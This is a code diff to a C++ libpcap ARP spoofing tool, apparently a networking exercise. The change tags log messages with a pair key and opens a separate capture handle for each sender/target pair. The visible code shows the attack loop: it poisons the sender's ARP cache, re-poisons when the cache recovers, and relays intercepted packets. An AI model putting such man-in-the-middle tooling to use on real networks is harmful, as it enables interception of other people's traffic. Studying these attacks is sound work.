@@ -186,7 +186,7 @@ void relay(pcap_t* handle, const u_char* packet, Pair& pair){
 
 void arp_spoof(pcap_t* handle, Pair& pair){
     infect(handle, pair);
-    printf("Sender infected!\n");
+    printf("[%d] Sender infected!\n", pair.key);
 
     while(true){
         struct pcap_pkthdr* header;
@@ -199,19 +199,24 @@ void arp_spoof(pcap_t* handle, Pair& pair){
         }
         if (is_recover(packet, pair)){
             infect(handle, pair);
-            printf("[DETECT] recover :: reinfect\n");
+            printf("[%d] detect recover :: reinfect\n", pair.key);
         } else if (is_spoofed_ip(packet, pair)) {
             relay(handle, packet, pair);
-            printf("[DETECT] spoofed IP :: relay\n");
+            printf("[%d] detect spoofed IP :: relay\n", pair.key);
         }
     }
 }
 
-void task(pcap_t* handle, Pair& pair){
+void task(char* dev, Pair& pair){
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+
     pair.smac = get_smac(handle, pair);
     pair.tmac = get_tmac(handle, pair);
 
-    printf("Sender MAC: %s\n", std::string(pair.smac).c_str());
-    printf("Target MAC: %s\n", std::string(pair.tmac).c_str());
+    printf("[%d] Sender MAC: %s\n", pair.key, std::string(pair.smac).c_str());
+    printf("[%d] Target MAC: %s\n", pair.key, std::string(pair.tmac).c_str());
     arp_spoof(handle, pair);
+
+    pcap_close(handle);
 }
